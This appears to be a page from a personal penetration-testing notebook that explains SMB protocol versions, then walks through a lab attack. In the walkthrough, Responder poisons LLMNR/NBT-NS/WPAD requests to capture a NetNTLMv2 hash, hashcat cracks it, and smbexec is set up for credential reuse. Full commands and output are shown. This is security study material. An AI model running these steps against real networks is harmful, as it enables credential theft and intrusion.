+<h3>6.12.3.4. SMB<a class="headerlink" href="#smb" title="Permalink to this headline">¶</a></h3>
+<div class="section" id="smb-protocol">
+<h4>6.12.3.4.1. SMB Protocol<a class="headerlink" href="#smb-protocol" title="Permalink to this headline">¶</a></h4>
+<p>SMB (<a class="reference external" href="http://en.wikipedia.org/wiki/Server_Message_Block">Server Message Block</a>) is the layer 6 remote file network protocol that originally used the NetBIOS API (over a variety of protocols) but can skip directly to TCP:</p>
+<blockquote>
+<div><dl class="docutils">
+<dt>Using the NetBIOS API over a variety of protocols:</dt>
+<dd><dl class="first last docutils">
+<dt>NBF - NetBIOS Frames protocol.</dt>
+<dd>The legacy (pre-TCP) communication.</dd>
+<dt>NBT - NetBIOS over TCP</dt>
+<dd><p class="first">UDP port 137 = NetBIOS Name Service (NBNS) WINS</p>
+<p>UDP port 138 = NBT Datagram broadcasts</p>
+<p class="last">TCP port 139 = NetBIOS Session Service (NBT sessions)</p>
+</dd>
+</dl>
+</dd>
+<dt>Since Windows 2000, skipping the NetBIOS API and using TCP directly:</dt>
+<dd><dl class="first last docutils">
+<dt>SMB Direct (since Windows 2000)</dt>
+<dd>TCP port 445 = “direct host SMB” skips NetBIOS protocol altogether</dd>
+</dl>
+</dd>
+</dl>
+</div></blockquote>
+<p>NetBIOS was developed for IBM in 1983 and in 1987 Microsoft announced LAN Manager which ran natively over NBF. In 1988 Microsoft and Intel announced the SMB Core Protocol. Windows 2000 introduced SMB direct, which skipped the NetBIOS API and used TCP directly. You may hear of the term CIFS (Common Internet File System), but <a class="reference external" href="https://www.eiseverywhere.com/file_uploads/b4f7436c4bc86fe545abe9fc042d4a7f_JoseBarreto_SMB3_Remote_File_Protocol_revision.pdf">SMB remote file protocol</a> indicates “CIFS means SMB as it existed in Windows NT 4”, “However, the term “CIFS” is commonly used incorrectly to refer to more recent versions of SMB like SMB2, SMB2.1 or SMB3”. So we use SMB instead of the term CIFS.</p>
+<p>Here is a summary of the SMB versions loosely adopted from <a class="reference external" href="http://www.oreilly.com/openbook/samba/book/ch03_03.html">3.3 An Introduction to SMB/CIFS</a> and extended for more recent versions:</p>
+<table border="1" class="colwidths-given docutils" id="id4">
+<caption><span class="caption-text">SMB Protocol Dialects</span><a class="headerlink" href="#id4" title="Permalink to this table">¶</a></caption>
+<colgroup>
+<col width="57%" />
+<col width="43%" />
+</colgroup>
+<thead valign="bottom">
+<tr class="row-odd"><th class="head">Protocol Name</th>
+<th class="head">Used By</th>
+</tr>
+</thead>
+<tbody valign="top">
+<tr class="row-even"><td>Core (PC NETWORK PROGRAM 1.0)</td>
+<td>&#160;</td>
+</tr>
+<tr class="row-odd"><td>Core Plus (MICROSOFT NETWORKS 1.03)</td>
+<td>&#160;</td>
+</tr>
+<tr class="row-even"><td>LAN Manager 1.0 (LANMAN1.0)</td>
+<td>&#160;</td>
+</tr>
+<tr class="row-odd"><td>LAN Manager 2.0 (LM1.2X002)</td>
+<td>&#160;</td>
+</tr>
+<tr class="row-even"><td>LAN Manager 2.1 (LANMAN2.1)</td>
+<td>&#160;</td>
+</tr>
+<tr class="row-odd"><td>NT LAN Manager 1.0 (NT LM 0.12)</td>
+<td>Windows NT 4.0</td>
+</tr>
+<tr class="row-even"><td>Samba’s NT LM 0.12 (Samba)</td>
+<td>Samba</td>
+</tr>
+<tr class="row-odd"><td>SMB 1</td>
+<td>Windows 2000</td>
+</tr>
+<tr class="row-even"><td>SMB 2</td>
+<td>Windows Vista</td>
+</tr>
+<tr class="row-odd"><td>SMB 2.1</td>
+<td>Windows 7, Server 2008R2</td>
+</tr>
+<tr class="row-even"><td>SMB 3</td>
+<td>Windows 8, Server 2012</td>
+</tr>
+<tr class="row-odd"><td>SMB 3.02</td>
+<td>Windows 8.1, Server 2012R2</td>
+</tr>
+<tr class="row-even"><td>SMB 3.10</td>
+<td>Windows 10</td>
+</tr>
+</tbody>
+</table>
+</div>
+<div class="section" id="exploits">
+<h4>6.12.3.4.2. Exploits<a class="headerlink" href="#exploits" title="Permalink to this headline">¶</a></h4>
+<p>From <a class="reference external" href="http://www.computerworld.com/article/2843632/security0/scenario-based-pen-testing-from-zero-to-domain-admin-with-no-missing-patches-required.html">Scenario-based pen-testing: From zero to domain admin with no missing patches required</a>:</p>
+<p>This takes advantage of the following shortcomings:</p>
+<ul>
+<li><p class="first">Password hashes are not salted, but NTLM challenges are salted with a nonce.</p>
+<p>From Wikipedia, <a class="reference external" href="http://en.wikipedia.org/wiki/Salt_%28cryptography%29">Salt</a>:</p>
+<blockquote>
+<div><p>“salt is random data that is used as an additional input to a one-way function that hashes a password or passphrase”.</p>
+</div></blockquote>
+<p>From Wikipedia, <a class="reference external" href="http://en.wikipedia.org/wiki/LM_hash">LM hash</a>:</p>
+<blockquote>
+<div><p>For hashing, NTLM uses Unicode support, replacing LMhash=DESeach(DOSCHARSET(UPPERCASE(password)), “KGS!&#64;#$%”) by NThash=MD4(UTF-16-LE(password)).</p>
+</div></blockquote>
+<p>So then the hash from a server remains static until the password is next changed. From Wikipedia <a class="reference external" href="http://en.wikipedia.org/wiki/Pass_the_hash">Pass the hash</a>:</p>
+<blockquote>
+<div><p>On systems/services using NTLM authentication, users’ passwords are never sent in cleartext over the wire. Instead, they are provided to the requesting system, such as a domain controller, as a hash in a response to a challenge-response authentication scheme.</p>
+<p>Native Windows applications ask users for the cleartext password, then call APIs like LsaLogonUser that convert that password to one or two hash values (the LM and/or NT hashes) and then send that to the remote server during NTLM authentication. Analysis of this mechanism has shown that the cleartext password is not required to complete network authentication successfully, only the hashes are needed.</p>
+<p>If an attacker has the hashes of a user’s password, they do not need to brute-force the cleartext password; they can simply use the hash of an arbitrary user account that they have harvested and execute a side channel attack to authenticate against a remote system and impersonate that user. In other words, from an attacker’s perspective, hashes are functionally equivalent to the original passwords that they were generated from.</p>
+</div></blockquote>
+</li>
+</ul>
+<p>This exploit uses the following steps:</p>
+<ol class="arabic">
+<li><p class="first">Start up Responder with HTTP &amp; SMB responders waiting for LLMNR &amp; NBT-NS poisoning to capture NETNTLM hashes.</p>
+</li>
+<li><p class="first">Use <strong class="program">hashcat</strong> is used to brute force the NETNTLM hash.</p>
+<p>The NETNTLM hashes are not useful for pass-the-hash.</p>
+</li>
+<li><p class="first">Run <strong class="program">smbexec</strong> using the captured credentials to log into machines looking for additional password hashes or plaintext passwords in memory. <strong class="program">smbexec</strong> uses the</p>
+</li>
+</ol>
+<div class="admonition-todo admonition" id="index-1">
+<p class="first admonition-title">Todo</p>
+<p class="last">why aren’t NETNTLM hashes useful for pass-the-hash?</p>
+</div>
+<p>First start up responder on Kali:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
+<span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
+<span class="hll"><span class="nv">MYIP</span><span class="o">=</span><span class="m">192</span>.168.1.104
+</span>ss -tnl
+<span class="hll"><span class="nv">$SUDO</span> responder -i <span class="nv">$MYIP</span> -w -F
+</span></pre></div>
+</div>
+<p>On the Windows box, flush the DNS cache via <code class="docutils literal"><span class="pre">ipconfig</span> <span class="pre">/flushdns</span></code>, fire up IE &amp; verify <span class="menuselection">Internet Options ‣ Connections ‣ LAN Settings</span> is checked, then visit a site.</p>
+<div class="highlight-batch"><div class="highlight"><pre><span></span><span class="hll">ipconfig /flushdns
+</span><span class="c1">REM Now fire up IE and browse to a site.</span>
+<span class="c1">REM This works when IE --&gt; Internet Options --&gt; Connections --&gt;</span>
+<span class="c1">REM   LAN Settings is &quot;Automatically detect settings&quot; is checked.</span>
+</pre></div>
+</div>
+<p>Back on Kali Linux you should first see a poisoned request for <code class="file docutils literal"><span class="pre">/wpad.dat</span></code> followed by a NetNTLMv2 hash captured:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$ SUDO=$</span><span class="o">(</span>which sudo<span class="o">)</span>
+<span class="gp">hacker@kali:~$</span> <span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
+<span class="hll"><span class="gp">hacker@kali:~$</span> <span class="nv">MYIP</span><span class="o">=</span><span class="m">192</span>.168.1.104
+</span><span class="gp">hacker@kali:~$</span> ss -tnl
+<span class="go">State      Recv-Q Send-Q        Local Address:Port          Peer Address:Port</span>
+<span class="hll"><span class="gp">hacker@kali:~/local/pentest/lethal/responder$ $</span>SUDO responder -i <span class="nv">$MYIP</span> -w -F
+</span><span class="go">NBT Name Service/LLMNR Responder 2.0.</span>
+<span class="go">Please send bugs/comments to: lgaffie@trustwave.com</span>
+<span class="go">To kill this script hit CRTL-C</span>
+
+<span class="go">[+]NBT-NS, LLMNR &amp; MDNS responder started</span>
+<span class="go">[+]Loading Responder.conf File..</span>
+<span class="go">Global Parameters set:</span>
+<span class="go">Responder is bound to this interface: ALL</span>
+<span class="hll"><span class="go">Challenge set: 1122334455667788</span>
+</span><span class="hll"><span class="go">WPAD Proxy Server: True</span>
+</span><span class="go">WPAD script loaded:  function FindProxyForURL(url, host){if ((host == &quot;localhost&quot;) || shExpMatch(host, &quot;localhost.*&quot;) ||(host == &quot;127.0.0.1&quot;) || isPlainHostName(host)) return &quot;DIRECT&quot;; if (dnsDomainIs(host, &quot;RespProxySrv&quot;)||shExpMatch(host, &quot;(*.RespProxySrv|RespProxySrv)&quot;)) return &quot;DIRECT&quot;; return &#39;PROXY ISAProxySrv:3141; DIRECT&#39;;}</span>
+<span class="hll"><span class="go">HTTP Server: ON</span>
+</span><span class="hll"><span class="go">HTTPS Server: ON</span>
+</span><span class="go">SMB Server: ON</span>
+<span class="go">SMB LM support: False</span>
+<span class="go">Kerberos Server: ON</span>
+<span class="go">SQL Server: ON</span>
+<span class="go">FTP Server: ON</span>
+<span class="go">IMAP Server: ON</span>
+<span class="go">POP3 Server: ON</span>
+<span class="go">SMTP Server: ON</span>
+<span class="go">DNS Server: ON</span>
+<span class="go">LDAP Server: ON</span>
+<span class="go">FingerPrint hosts: False</span>
+<span class="go">Serving Executable via HTTP&amp;WPAD: OFF</span>
+<span class="go">Always Serving a Specific File via HTTP&amp;WPAD: OFF</span>
+
+
+<span class="hll"><span class="go">LLMNR poisoned answer sent to this IP: 192.168.1.103. The requested name was : wpad.</span>
+</span><span class="hll"><span class="go">[+]HTTP GET request from : 192.168.1.103. The HTTP URL requested was: /wpad.dat</span>
+</span><span class="hll"><span class="go">[+]HTTP NTLMv2 hash captured from : 192.168.1.103</span>
+</span><span class="hll"><span class="go">Complete hash is :  jgm::taxing:1122334455667788:BE429406642BF55E51748A867ACDD409:010100000000000042A43E2C048ED00113456A9D55B36A4E000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C0008003000300000000000000001000000001000005436C9CCC131C3A88D569E3A3CAD25E1882D24E33F82CB960F8C6809D4139D3F0A001000000000000000000000000000000000000900240048005400540050002F003100390032002E003100360038002E0031002E003100300034000000000000000000</span>
+</span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
+</pre></div>
+</div>
+<p>Since the NetNTLMv2 hash is salted it can’t be used for “pass-the-hash” but we can try to crack it with <strong class="program">hashcat</strong> in another terminal session:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="hll"><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
+</span><span class="hll"><span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
+</span><span class="nv">PASSWORD</span><span class="o">=</span>password
+<span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.103
+<span class="c1"># copy captured NetNTLMv2 hashes to hashes.txt</span>
+<span class="c1">#   format = USER::DOMAIN:NONCE:NTLMV2HASH:RESPONSE</span>
+<span class="c1">#      USER = user id</span>
+<span class="c1">#      DOMAIN = account database (DOMAIN or SAM)</span>
+<span class="c1">#      NONCE = challenge</span>
+<span class="hll"><span class="c1">#      NTLMV2HASH = HMAC-MD5 hash</span>
+</span><span class="c1">#      RESPONSE = entire NTLMv2 response except for NTLMV2HASH</span>
+<span class="hll">cp /usr/share/responder/HTTP-NTLMv2-Client-<span class="nv">$T</span>.txt hashes.txt
+</span><span class="hll"><span class="c1"># add the actual password to rockyou.txt if not already there</span>
+</span><span class="nb">echo</span> <span class="s2">&quot;</span><span class="nv">$PASSWORD</span><span class="s2">&quot;</span> &gt; words.txt
+<span class="hll">zcat /usr/share/wordlists/rockyou.txt.gz &gt;&gt; words.txt
+</span><span class="hll"><span class="c1"># crack NetNTLMv2 hash = 5600</span>
+</span><span class="nv">$SUDO</span> hashcat --hash-type<span class="o">=</span><span class="m">5600</span> --potfile-disable hashes.txt words.txt <span class="se">\</span>
+    <span class="p">|</span> tee cracked.txt
+</pre></div>
+</div>
+<p>Running this gives us our cracked password:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~$ SUDO=$</span><span class="o">(</span>which sudo<span class="o">)</span>
+</span><span class="hll"><span class="gp">hacker@kali:~$</span> <span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
+</span><span class="gp">hacker@kali:~$</span> <span class="nv">PASSWORD</span><span class="o">=</span>password
+<span class="gp">hacker@kali:~$</span> <span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.103
+<span class="gp">hacker@kali:~$ #</span> copy captured NetNTLMv2 hashes to hashes.txt
+<span class="gp">hacker@kali:~$ #</span>   <span class="nv">format</span> <span class="o">=</span> USER::DOMAIN:NONCE:NTLMV2HASH:RESPONSE
+<span class="gp">hacker@kali:~$ #</span>      <span class="nv">USER</span> <span class="o">=</span> user id
+<span class="gp">hacker@kali:~$ #</span>      <span class="nv">DOMAIN</span> <span class="o">=</span> account database <span class="o">(</span>DOMAIN or SAM<span class="o">)</span>
+<span class="gp">hacker@kali:~$ #</span>      <span class="nv">NONCE</span> <span class="o">=</span> challenge
+<span class="hll"><span class="gp">hacker@kali:~$ #</span>      <span class="nv">NTLMV2HASH</span> <span class="o">=</span> HMAC-MD5 <span class="nb">hash</span>
+</span><span class="gp">hacker@kali:~$ #</span>      <span class="nv">RESPONSE</span> <span class="o">=</span> entire NTLMv2 response except <span class="k">for</span> NTLMV2HASH
+<span class="hll"><span class="gp">hacker@kali:~$</span> cp /usr/share/responder/HTTP-NTLMv2-Client-<span class="nv">$T</span>.txt hashes.txt
+</span><span class="hll"><span class="gp">hacker@kali:~$ #</span> add the actual password to rockyou.txt <span class="k">if</span> not already there
+</span><span class="gp">hacker@kali:~$</span> <span class="nb">echo</span> <span class="s2">&quot;</span><span class="nv">$PASSWORD</span><span class="s2">&quot;</span> &gt; words.txt
+<span class="hll"><span class="gp">hacker@kali:~$</span> zcat /usr/share/wordlists/rockyou.txt.gz &gt;&gt; words.txt
+</span><span class="hll"><span class="gp">hacker@kali:~$ #</span> crack NetNTLMv2 <span class="nb">hash</span> <span class="o">=</span> <span class="m">5600</span>
+</span><span class="gp">hacker@kali:~$ $</span>SUDO hashcat --hash-type<span class="o">=</span><span class="m">5600</span> --potfile-disable hashes.txt words.txt <span class="se">\</span>
+<span class="hll">&gt;     <span class="p">|</span> tee cracked.txt
+</span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
+<span class="gp">hacker@kali:~$</span> cat cracked.txt
+<span class="go">Initializing hashcat v0.49 with 1 threads and 32mb segment-size...</span>
+
+<span class="go">Added hashes from file hashes.txt: 1 (1 salts)</span>
+<span class="go">Activating quick-digest mode for single-hash with salt</span>
+
+<span class="hll"><span class="go">NOTE: press enter for status-screen</span>
+</span>
+<span class="go">JGM::taxing:1122334455667788:be429406642bf55e51748a867acdd409:010100000000000042a43e2c048ed00113456a9d55b36a4e000000000200060053004d0042000100160053004d0042002d0054004f004f004c004b00490054000400120073006d0062002e006c006f00630061006c000300280073006500720076006500720032003000300033002e0073006d0062002e006c006f00630061006c000500120073006d0062002e006c006f00630061006c0008003000300000000000000001000000001000005436c9ccc131c3a88d569e3a3cad25e1882d24e33f82cb960f8c6809d4139d3f0a001000000000000000000000000000000000000900240048005400540050002f003100390032002e003100360038002e0031002e003100300034000000000000000000:password</span>
+
+<span class="go">All hashes have been recovered</span>
+
+<span class="go">Input.Mode: Dict (words.txt)</span>
+<span class="go">Index.....: 1/5 (segment), 3625424 (words), 33550337 (bytes)</span>
+<span class="go">Recovered.: 1/1 hashes, 1/1 salts</span>
+<span class="go">Speed/sec.: - plains, - words</span>
+<span class="go">Progress..: 4/3625424 (0.00%)</span>
+<span class="go">Running...: --:--:--:--</span>
+<span class="go">Estimated.: --:--:--:--</span>
+
+<span class="go">Started: Wed May 13 22:15:26 2015</span>
+<span class="go">Stopped: Wed May 13 22:15:26 2015</span>
+<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
+</pre></div>
+</div>
+<p>Now want to run <a class="reference external" href="https://github.com/pentestgeek/smbexec">smbexec</a></p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
+<span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
+<span class="nv">INSTALL_DIR</span><span class="o">=</span><span class="s2">&quot;/usr/local/bin&quot;</span>
+<span class="nb">cd</span> <span class="nv">$INSTALL_DIR</span>
+<span class="nv">$SUDO</span> git clone https://github.com/pentestgeek/smbexec.git smbexec.git
+<span class="nb">cd</span> smbexec.git
+<span class="nv">$SUDO</span> ./install.sh
+</pre></div>
+</div>
+<p><a class="reference external" href="http://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning">Local Network Attacks: LLMNR and NBT-NS Poisoning</a></p>
+<p><a class="reference external" href="https://blog.netspi.com/smb-attacks-through-directory-traversal/">SMB Attacks Through Directory Traversal</a></p>
+<p><a class="reference external" href="http://www.room362.com/blog/2014/05/21/effective-ntlm-slash-smb-relaying/">Effective NTLM / SMB Relaying</a></p>
+<p><a class="reference external" href="http://www.infosecisland.com/blogview/22807-Refresher-Series-Capturing-and-cracking-SMB-hashes-with-Cain-and-Half-LM-rainbow-tables.html">Refresher Series - Capturing and cracking SMB hashes with Cain and Half-LM rainbow tables</a></p>
+<p><a class="reference external" href="http://www.defenceindepth.net/2011/04/attacking-lmntlmv1-challengeresponse_21.html">Attacking LM/NTLMv1 Challenge/Response Authentication</a></p>
+<p><a class="reference external" href="http://nmap.org/nsedoc/scripts/smb-enum-users.html">nmap smb-enum-users</a></p>
+<p><a class="reference external" href="https://labs.portcullis.co.uk/tools/enum4linux/">enum4linux</a></p>
+<p>HTML injection</p>
+<p>forced NTLM auth for wpad.dat file retrieval</p>
+<p>SMBRelay - relay selected account credentials to target systems &amp; run command</p>
+<p>analyze mode - no poisoned responses</p>
+<p>WPAD description in <a class="reference external" href="http://blog.spiderlabs.com/2014/02/responder-20-owning-windows-networks-part-3.html">Responder 2.0 - Owning Windows Networks part 3</a></p>
+<p>SMB Relay Modules as in ^^^^^</p>
+<p>stealthiness</p>
+<p>ICMP redirect</p>
+<p>Windows =&lt; 5.2 Domainmembers (XP, Windows server 2003 and above) have ICMP Redirectenabled by default. This functionality can be used to remotely add(with no authentication required) a new route for a given host. Yes,you heard me right.</p>
+<p><a class="reference external" href="http://www.pciqsatalk.com/disable-llmnr-netbios/">How to Get Less Findings on Your Next Internal Penetration Test</a></p>
+<p><a class="reference external" href="http://www.surecloud.com/newsletter/local-network-vulnerabilities-llmnr-and-nbt-ns-poisoning">Local Network Vulnerabilities - LLMNR and NBT-NS Poisoning</a></p>
+</div>
+</div>
+</div>
+</div>
+
+
+           </div>
+           <div class="articleComments">
+            
+           </div>
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="socat.html" class="btn btn-neutral float-right" title="6.13. socat vs (nc vs ncat vs netcat)" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
+      
+      
+        <a href="proxychains.html" class="btn btn-neutral" title="6.11. Proxy Chains" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>
+        &copy; Copyright 2017, bitbender.
+
+    </p>
+  </div>
+  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+
+</footer>
+
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+  
+
+
+  
+
+    <script type="text/javascript">
+        var DOCUMENTATION_OPTIONS = {
+            URL_ROOT:'../',
+            VERSION:'1.0.2',
+            COLLAPSE_INDEX:false,
+            FILE_SUFFIX:'.html',
+            HAS_SOURCE:  true,
+            SOURCELINK_SUFFIX: '.txt'
+        };
+    </script>
+      <script type="text/javascript" src="../_static/jquery.js"></script>
+      <script type="text/javascript" src="../_static/underscore.js"></script>
+      <script type="text/javascript" src="../_static/doctools.js"></script>
+      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+  
+
+  
+  
+    <script type="text/javascript" src="../_static/js/theme.js"></script>
+  
+
+  
+  
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.StickyNav.enable();
+      });
+  </script>
+   
+
+</body>
+</html>
